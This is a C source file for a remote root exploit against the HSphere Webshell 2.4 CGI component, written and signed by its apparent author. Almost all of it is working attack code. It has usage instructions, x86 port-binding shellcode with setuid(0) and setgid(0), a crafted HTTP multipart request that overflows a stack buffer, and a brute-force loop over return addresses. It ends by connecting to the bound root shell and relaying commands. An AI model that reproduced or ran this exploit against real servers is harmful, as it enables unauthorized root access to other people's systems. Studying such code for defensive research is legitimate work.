/*
 * Remote r00t exploit for Webshell 2.4 (possibly other versions).
 * Vulnerability found and exploit written by Carl Livitt
 * (carl (@) learningshophull.co.uk).
 *

Exploits a simple stack-based buffer overflow in CGI.C of the
HSphere webshell component which is installed SUID & GUID root
by default.

This exploit will bind a r00t shell to port 10000 (by default) of
the remote box. Feel free to use any shellcode of your choice.

This code is a butchered version of the local exploit for
webshell. It works on my test box, and won't be refined any further,
although the bruteforcer should work on most webshell installations.

To exploit:

gcc -o webshell-remote webshell-remote.c
./webshell-remote -t www.host-to-exploit.com -l /path/to/webshell

That's it. It'll work on almost all vulnerable hosts (running Linux).
*/


#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>
#include <time.h>

/*
 * Play with these to make it work (if it fails!)
 */
#define EGG_SIZE_START 280
#define EGG_SIZE_END 291
#define RET_ADDR_START 0xbffff010
#define RET_ADDR_END 0xbfffffff
#define RET_ADDR_INCR 768
#define COMMAND1 "id\n"
#define COMMAND2 "uname -a\n"
#define ROOT_SHELL_PORT 10000

// should only be needed against localhost. Set to 0 to disable.
#define SLEEP_TIME 125000000L

// don't play with this, you'll only break things.
#define CONTENT_LENGTH 43

void make_shellcode();
void make_exploit_buffer();
void make_boundary_buffer();

/*
 * 88 bytes portbinding shellcode - linux-x86
 * - by bighawk (bighawk@warfare.com)
 *   setuid(0) and setgid(0) added by Carl Livitt
 */
char shellcode[] =
   "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80" // setuid(0),setgid(0)
   "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
   "\x89\xc7\x52\x66\x68"
   "XX" // XX is port number
   "\x43\x66\x53\x89\xe1\xb0\x10\x50\x51"
   "\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50\x57"
   "\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
   "\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
   "\x51\x53\x89\xe1\xb0\x0b\xcd\x80"; // bind shell on port 10000

/*
 * Ahhhh, global variables make life easy :)
 */
char sc[1024];
char egg[1024];
char exploit_buf[4096];
char target[256];
int port=80;
char location[1024];
unsigned long RET_ADDR;
int EGG_SIZE, root_shell_port=ROOT_SHELL_PORT;

char usage[]=
"-h           This cruft\n"
"-t host      Target host (eg. www.xyzzy.com)\n"
"-p port      Target port [80]\n"
"-P port      Port to bind shell on remote host [10000]\n"
"-l location  Location of webshell (eg. /cgi-bin/webshell)\n\n"
"Example:\n\n"
"./exp-remote -t www.xyzzy.com -p 8080 -P 12345 -l /psoft/servlet/psoft.hsphere.CP\n\n"
"This would attack http://www.xyzzy.com:8080/psoft/servlet/psoft.hsphere.CP\n"
"and bind a root shell to port 12345 if successful.\n\n";

/*
 * The fun begins here...
 */

 main(int argc, char **argv) {
        int ch, websock, shellsock,r=1;
        struct hostent *host;
        struct sockaddr_in saddr;
        char buf[8092];
        struct timespec sleepTime;
        fd_set rfds;
        int retval;

        /*
         * Process command-line args
         */
        while((ch=getopt(argc,argv,"ht:p:P:l:"))!=-1) {
                switch(ch) {
                        case 'h':
                                printf("%s",usage);
                                exit(0);
                                break;
                        case 't':
                                strncpy(target, optarg, sizeof(target)-1);
                                break;
                        case 'p':
                                port=atoi(optarg);
                                break;
                        case 'P':
                                root_shell_port=atoi(optarg);
                                break;
                        case 'l':
                                strncpy(location, optarg, sizeof(location)-1);
                                break;
                        default:
                                printf("%s", usage);
                                exit(0);
                                break;
                }
        }

        /*
         * Tell the attacker we're about to start the exploit.
         * Look up the IP address of the host specified on the
         * command-line
         */
        if((host=gethostbyname(target))==NULL) {
                printf("Host not found. Usage:\n%s\n", usage);
                exit(1);
        }
        printf("Exploiting http://%s:%d%s%s..", target, port, (location[0]=='/')?"":"/", location);

        /*
         * Start the bruteforce loop
         */
        for(RET_ADDR=RET_ADDR_START; RET_ADDR<RET_ADDR_END; RET_ADDR+=RET_ADDR_INCR) {
                for(EGG_SIZE=EGG_SIZE_START; EGG_SIZE<EGG_SIZE_END; EGG_SIZE++) {
                        /*
                         * Setup the exploit strings and
                         * HTTP headers. The Accept-Encoding header
                         * will hold shellcode: it will be passed
                         * to the environment of webshell giving us
                         * a reasonably predictable RET address.
                         */
                        make_shellcode();
                        make_boundary_buffer();
                        make_exploit_buffer();

                        /*
                         * Now connect to the host and send the exploit
                         * string...
                         */
                        if((websock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1) {
                                perror("socket()");
                                exit(1);
                        }
                        memset((void *)&saddr, 0, sizeof(struct sockaddr_in));
                        saddr.sin_family=AF_INET;
                        saddr.sin_addr.s_addr=*((unsigned long *)host->h_addr_list[0]);
                        saddr.sin_port=htons(port);
                        printf(".");fflush(stdout);
                        if(connect(websock, (struct sockaddr *)&saddr, sizeof(saddr))<0) {
                                perror("connect()");
                                exit(1);
                        }
                        send(websock, exploit_buf, strlen(exploit_buf), 0);
                        close(websock);

                        /*
                         * This pause is needed when exploiting localhost.
                         * It can be ignored against remote hosts (I think!)
                         */
                        sleepTime.tv_sec=0;
                        sleepTime.tv_nsec=SLEEP_TIME;
                        nanosleep(&sleepTime, &sleepTime);

                        /*
                         * If the exploit attempt succeded, there should now
                         * be a r00t shell bound to port xxxxx of the target
                         * box. Lets try and connect to it...
                         */
                        if((shellsock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1) {
                                perror("socket()");
                                exit(1);
                        }
                        memset((void *)&saddr, 0, sizeof(struct sockaddr_in));
                        saddr.sin_family=AF_INET;
                        saddr.sin_addr.s_addr=*((unsigned long *)host->h_addr_list[0]);
                        saddr.sin_port=htons(root_shell_port);
                        if(connect(shellsock, (struct sockaddr *)&saddr, sizeof(saddr))==0)
                                goto CONNECTED; // goto? Damn amateurs...

                        /*
                         * If we get here, the exploit failed. Try the next
                         * iteration of the brute force loop.
                         */
                        close(shellsock);
                }
        }
        /*
         * If we get here, then the bruteforce was exhausted without a
         * succesful exploit.
         */
        printf("\nFailed to exploit the webshell binary. :(\n");
        exit(0);

CONNECTED:
        /*
         * We're now connected to the remote host. Issue
         * some commands... ('id' and 'uname -a' by default)
         */
        printf("\n\nExploit successful!\nIssuing some commands...\n\n");
        if(send(shellsock, COMMAND1, strlen(COMMAND1), 0)==-1) {
                perror("send()");
                exit(1);
        }
        buf[recv(shellsock, buf, sizeof(buf)-1, 0)]='\0';
        printf("%s", buf);
        send(shellsock, COMMAND2, strlen(COMMAND2), 0);
        buf[recv(shellsock, buf, sizeof(buf)-1, 0)]='\0';
        printf("%s\n", buf);
        printf("You are now at a bash prompt...\n");

        /*
         * Now let the attacker issue commands to the remote
         * shell, just as if (s)he had launched 'nc host 10000'.
         * Note the dodgy coding of assigning NULLs to the buf[]
         * array. What would happen if recv() or read() returned -1 ?
         * You guessed it: we mung some variables on the stack!
         */
        do {
                FD_ZERO(&rfds);
                FD_SET(0, &rfds);
                FD_SET(shellsock, &rfds);
                retval=select(shellsock+1, &rfds, NULL, NULL, NULL);
                if(retval) {
                        if(FD_ISSET(shellsock, &rfds)) {
                                buf[(r=recv(shellsock, buf, sizeof(buf)-1,0))]='\0';
                                printf("%s", buf);
                        }
                        if(FD_ISSET(0, &rfds)) {
                                buf[(r=read(0, buf, sizeof(buf)-1))]='\0';
                                send(shellsock, buf, strlen(buf), 0);
                        }

                }
        } while(retval && r); // loop until connection terminates
        close(shellsock);
        exit(0);
}

/*
 * Create the HTTP request that will setup the exploit
 * conditions in webshell. Shellcode is stored in the
 * Accept-Encoding HTTP header.
 */
void make_exploit_buffer() {
        sprintf(exploit_buf,"POST %s HTTP/1.1\n",location);
        sprintf(exploit_buf,"%sHost: %s\n",exploit_buf,target);
        sprintf(exploit_buf,"%sAccept-Encoding: %s\n",exploit_buf, sc);
        sprintf(exploit_buf,"%s%s\n",exploit_buf,egg);
        sprintf(exploit_buf,"%sContent-Length: %d\n\n",exploit_buf,EGG_SIZE*2);
        sprintf(exploit_buf,"%s--%s\n",exploit_buf, egg+CONTENT_LENGTH);
        sprintf(exploit_buf,"%sContent-Disposition: form-data; name=\"TESTNAME\"; filename=\"TESTFILENAME\"\r\n\r\n",exploit_buf);
        sprintf(exploit_buf,"%s%-*s\n",exploit_buf, EGG_SIZE*4," ");
}

/*
 * Create the buffer that holds the 'boundary' data. This
 * is what actually overflows the buffer on the stack.
*/
void make_boundary_buffer() {
        int i;

        memset(egg, 0, EGG_SIZE-1);
        memcpy(egg, "Content-Type: multipart/form-data boundary=", CONTENT_LENGTH);
        for(i=0;i<EGG_SIZE; i+=4) {
                egg[i+CONTENT_LENGTH]=RET_ADDR&0xff;
                egg[i+CONTENT_LENGTH+1]=(RET_ADDR>>8)&0xff;
                egg[i+CONTENT_LENGTH+2]=(RET_ADDR>>16)&0xff;
                egg[i+CONTENT_LENGTH+3]=(RET_ADDR>>24)&0xff;
        }
        egg[EGG_SIZE+CONTENT_LENGTH-1]='\0';
}

/*
 * Creates a 1024-byte buffer holding NOPs and shellcode.
 */
void make_shellcode() {
        // Fill in the port number
        shellcode[33]=htons(root_shell_port)&0xff;
        shellcode[34]=(htons(root_shell_port)>>8)&0xff;

        // Finish making shellcode buffer
        memset(sc, 0x90,1024);
        memcpy(sc + 1024 - (strlen(shellcode)+1), shellcode, strlen(shellcode));
        sc[1023]='\0';
}

